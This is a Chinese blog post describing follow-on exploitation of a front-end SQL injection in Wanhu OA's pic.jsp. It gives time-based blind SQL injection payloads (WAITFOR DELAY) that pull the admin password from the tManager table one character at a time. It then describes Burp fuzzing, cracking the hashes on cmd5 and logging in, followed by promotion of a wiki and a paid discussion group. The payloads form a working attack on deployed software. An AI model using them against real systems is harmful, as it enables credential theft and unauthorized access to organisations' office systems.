#  某户oa sql注入漏洞后续利用（部分）   
goddemon  goddemon的小屋   2024-08-22 18:39  
  
## 前言：  
  
有朋友在  
问，也恰好有空，那就写一篇分享下吧。  
  
这个oa网上遇到的poc的话，大部分情况是sql没修，权限绕过修复了导致之前爆出去的上传漏洞打不了。   
  
但是可以利用前台的sql注入dump出密码，进而去打。  
  
## 正文：  
  
这里只给一个pic.jsp  
  
万户的数据库账户表默认为tManager表，且据笔者遇到而言，大部分均为sqlserver数据库。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BYtyQicN4iaC4uCibdicCJcBhE0zgWW9WYhGNXOHqN03B2qm8QM36zKzF7GxpPBibbtFyKtRdyCJbv7pe0swicb2DvgA/640?wx_fmt=png&from=appmsg "")  
因此根据这个就可以去构造延时注入的sql语句，进而根据时间回显判断出具体的payload。  
  
  
如结合之前的pic.jsp这个注入的payload  
```
10  manager_pwd from  [oa]..[tManager] IF((SELECT TOP 10 SUBSTRING(manager_pwd, 1,1) AS first_char FROM [oa]..[tManager] WHERE manager_zh = 'admin')='D') WAITFOR DELAY '0:0:5'--
10  manager_pwd from  [oa]..[tManager] IF((SELECT TOP 10 SUBSTRING(manager_pwd, 2,1) AS first_char FROM [oa]..[tManager] WHERE manager_zh = 'admin')='D') WAITFOR DELAY '0:0:5'--

```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/BYtyQicN4iaC4uCibdicCJcBhE0zgWW9WYhGqKl3BV24f2OsawvlyaHWe4iauqficxuG0MyYDiaSwbrvj28XGCOPJl7icw/640?wx_fmt=other&from=appmsg "")  
  
而后burp fuzz即可![](https://mmbiz.qpic.cn/mmbiz_jpg/BYtyQicN4iaC4uCibdicCJcBhE0zgWW9WYhGWr4VP0T77rgng0kt3y5A2ibS4ZFSvjia03AibbPEG2TcylvOrV3P7vzhQ/640?wx_fmt=other&from=appmsg "")  
而后排序解密即可![](https://mmbiz.qpic.cn/mmbiz_png/BYtyQicN4iaC4uCibdicCJcBhE0zgWW9WYhGNIp5ApNrZaqI4GMicXbleVjRM5ObU4zcZ7ap5xibdxVUJtwy0icicQib4dw/640?wx_fmt=png&from=appmsg "")  
而后cmd5解密 登录即可  
## 后文：  
  
1、top100bug wiki 放10个，慢慢更吧  
  
可以理解为提供一个交流渠道吧  
  
http://wiki.top100bug.com/  
```
d660dfb7312e0d30f8007d7b50a706ed
6b5209f71be18361322c514421c1e728
b713b4434f838019a17993af18be1ae5
67d4df97c5d60505eaa2dd0a3b680dad
6739ecaf84dc5a9e02eaf7419e45dcfd
0c19a8408b4da1c32261340175b0afa6
2a26bbc61c3ddd5dd72b51f576844c8d
f78b2b4b3337e76f7d5ab223f4e183ce
d4940670e51e3ef851d00a63b4630628
8cabef624acf034101b4cbc23c5635f3

```  
  
内容的话，认真想了想还是不要提交漏洞poc吧，提交了也不过审。  
  
  
好玩的姿势的话可以有，以及有趣的姿势可以有，但是记得打码。  
  
  
2、星球会开设一个专题，漏洞分析专题，对以往的漏洞进行原理分析以及如何进阶利用。   
  
部分内容看情况同步公众号。  
  
  
3、私聊，添加问题，不一定均回复。   
  
在DIY和研究技术中![](https://mmbiz.qpic.cn/mmbiz_jpg/BYtyQicN4iaC4uCibdicCJcBhE0zgWW9WYhG2YnTib26lo9cuDX2Q3L7jywjRXGgWoRYZMxnQQndDBhGMX8C1OvudIg/640?wx_fmt=jpeg&from=appmsg "")  
4、 加了星球注意加公众号的微信，拉进群   
  
虽然说不是天天讨论技术，但是有问题一起交流以及看到好玩的技术分享   
  
其实还是可以有的![](https://mmbiz.qpic.cn/mmbiz_jpg/BYtyQicN4iaC4uCibdicCJcBhE0zgWW9WYhGeqGveIW5FPrLonegtUlBUTXeqGRtTr7wQ5lU6HiaCd1icekQnsIFVeibw/640?wx_fmt=jpeg&from=appmsg "")  
  
##   
  
  
  
